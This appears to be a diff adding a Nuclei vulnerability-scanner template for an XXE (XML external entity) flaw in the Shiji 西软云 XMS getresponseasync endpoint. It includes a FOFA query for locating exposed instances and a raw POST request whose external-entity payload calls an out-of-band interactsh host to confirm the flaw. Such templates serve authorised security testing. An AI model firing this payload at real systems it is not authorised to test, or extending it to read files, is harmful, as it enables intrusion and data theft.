@@ -1,0 +1,47 @@
+id: xiruanyun-getresponseasync-xxe
+
+info:
+  name: 西软云XMS-getresponseasync-XML实体注入漏洞
+  author: candada
+  severity: critical
+  description: '西软云 XMS getresponseasync 存在 XML 实体注入漏洞（XXE），攻击者可利用该漏洞获取敏感信息。'
+  reference:
+    - http://
+  tags: 2024,西软云,xxe
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="shiji-西软云XMS"
+  classification:
+    cvss-metrics: 
+    cvss-score: 
+    cve-id: 
+    cwe-id: 
+    epss-score: 
+    epss-percentile: 
+    cpe:
+
+http:
+  - raw:
+      - |
+        POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: 
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=D951D74512C15DD4E951A1F0A52CB0F9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 79
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
